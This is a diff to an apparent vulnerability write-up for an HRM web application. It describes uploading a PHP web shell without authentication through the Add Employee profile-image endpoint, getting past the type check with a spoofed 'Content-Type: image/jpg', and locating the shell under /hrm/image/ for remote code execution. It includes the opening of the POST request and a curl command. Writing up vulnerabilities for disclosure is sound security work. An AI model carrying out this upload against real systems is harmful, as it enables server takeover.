@@ -18,7 +18,13 @@ Bypass check type using `Content-Type: image/jpg` in the upload form.
 
 ### 2. Upload web shell without authentication
 
-Burp Payload
+At `Add Employee` function, we discover an Profile Image upload button
+
+![](images/function-add-employee.png)
+
+After analysis the source code, we know that `/hrm/controller/employee.php` allow an unauthorized user access and upload image file.
+
+Let's upload file webshell `leecybersec.php` with `Content-Type: image/jpg` without any unauthorization.
 
 ``` txt
 POST /hrm/controller/employee.php?empedit= HTTP/1.1
@@ -57,9 +63,13 @@ Content-Disposition: form-data; name="imagefilename"
 
 ![](images/sent-payload.png)
 
-### 3. Find the uploaded web shell file and get RCE
+### 3. Find the uploaded webshell file and get RCE
 
-Go to /hrm/image/ and get web shell name
+The webshell name will be added with random number and stored at `image` folder.
+
+![](images/file-path-webshell.png)
+
+Go to /hrm/image/ and get webshell name
 
 ``` bash
 curl localhost/hrm/image/
